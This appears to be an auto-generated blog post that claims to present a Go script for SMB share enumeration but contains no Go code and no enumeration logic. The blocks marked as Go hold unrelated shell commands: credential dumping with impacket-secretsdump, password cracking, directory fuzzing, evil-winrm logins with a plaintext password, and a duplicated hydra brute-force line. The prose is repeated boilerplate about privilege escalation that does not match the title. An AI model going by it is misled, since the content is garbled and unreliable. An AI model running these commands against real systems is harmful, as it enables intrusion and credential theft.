---
TitleSEO: "SMB Share Enumeration Script in Go | ZureFX"
TitlePost: "SMB Share Enumeration Script — Go"
Author: "ZureFX"
Description: "A Go script for smb share enumeration script. Built for security research and automation."
Keywords: "rust, script, powershell, python, c, tool, go"
URL: "https://zurefx.github.io/scripting/script-smb-share-enumeration-script-431.html"
URL_IMAGES: ""
Date: "2025-04-01"
Tags: "Rust, Script, PowerShell, Python, C, Tool, Go"
Section: "scripting"
Lang: "en"
main_img: "script-smb-share-enumeration-script-431"
Permalink: "/scripting/script-smb-share-enumeration-script-431.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism. Privilege escalation was possible due to misconfigured sudo permissions.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `gobuster`
- `netcat`
- `msfvenom`

## Implementation

### Core Logic

The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

```go
impacket-secretsdump administrator:'P@ssw0rd!'@10.103.229.252
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.103.100.115/FUZZ
```

The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services.

### Helper Functions

Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service.

```go
gobuster dir -u http://10.67.110.115/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p443,587,9200 10.20.132.78 -oN scan.txt
```

## Usage

### Basic Usage

Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
evil-winrm -i 10.13.171.202 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

### Advanced Options

Unconstrained delegation was enabled on the compromised machine. Command injection was possible through unsanitized user input in the search functionality. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.70.162.146 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.64.191.166 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism.

```
[+] Scanning target...
[+] Found 15 results
[+] Done in 12.39s
```
